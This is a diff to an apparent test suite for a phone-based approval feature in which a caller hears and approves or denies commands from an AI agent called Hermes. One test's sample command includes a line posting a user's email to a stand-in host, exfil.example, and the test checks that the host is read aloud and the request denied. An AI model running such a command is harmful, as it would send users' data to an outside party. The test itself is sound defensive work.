@@ -347,13 +347,16 @@ async def test_every_web_address_in_the_code_is_said_as_written(phone_adapter, m
     """Whatever the description says, and also those Hermes's text cleaner would drop as code."""
     phone = await logged_in_phone(phone_adapter)
     texts = said(monkeypatch)
-    hosts = ["hooks.slack.com", "api-v2.example.com", "example.sh", "[2001:db8::1]", "198.51.100.7",
-             "xn--80ak6aa92e.com"]
-    command = "execute_code <<'PY'\n" + "".join(f"get('https://{host}:8080/x')\n" for host in hosts) + "PY"
+    command = ("execute_code <<'PY'\n"
+               + "".join(f"get('https://{host}:8080/x')\n" for host in ["hooks.slack.com", "api-v2.example.com",
+                                                                        "example.sh", "[2001:db8::1]", "198.51.100.7",
+                                                                        "xn--80ak6aa92e.com"])
+               + "post('https://exfil.example',json={'u':'alice@trusted.example'})\nPY")
 
     approval = await asked(phone_adapter, phone, command=command)
 
-    assert f"{SHORT_PHRASES['approval_addresses']} {', '.join(hosts)}." in texts
+    assert (f"{SHORT_PHRASES['approval_addresses']} hooks.slack.com, api-v2.example.com, example.sh, 2001:db8::1, "
+            "198.51.100.7, xn--80ak6aa92e.com, exfil.example.") in texts
     await phone.press("2")
     assert await approval.choice() == "deny"
     await phone.hang_up()
@@ -413,6 +416,28 @@ async def test_speech_over_an_approval_never_reaches_hermes_even_if_a_key_answer
     await asyncio.sleep(3)  # longer than the recognition would take
     assert not events
     await phone.hang_up()
+
+
+async def test_speech_recognised_while_an_approval_came_cannot_skip_its_prompt(make_adapter, monkeypatch):
+    """Talking over a message, then an approval (e.g. of work in the background) comes while that is recognised:
+    the speech is dropped, and the prompt is still said in full before a key counts."""
+    question = "Počkej, ještě než to uděláš, mám k tomu jednu důležitou otázku."
+    FakeSTT(monkeypatch, question, delay=3)
+    adapter, phone = await calling(make_adapter, approval_timeout=3)
+    events = recording_handler(adapter)
+    await deliver(adapter, MESSAGE)
+    await phone.wait_for_speech(timeout=10, run=20)
+    await phone.say(question)
+    await asyncio.sleep(1)  # the speech has ended and is being recognised
+    approval = Approval(adapter, str(phone.call_id))
+
+    await asyncio.sleep(3)  # recognised
+    await phone.press("1")
+
+    assert await approval.choice() == "deny"  # the key came while the prompt was said, and none after it
+    assert not events
+    await phone.hang_up()
+    await adapter.disconnect()
 
 
 async def test_an_answer_hermes_does_not_take_from_the_caller_withdraws_the_approval(phone_adapter, monkeypatch):
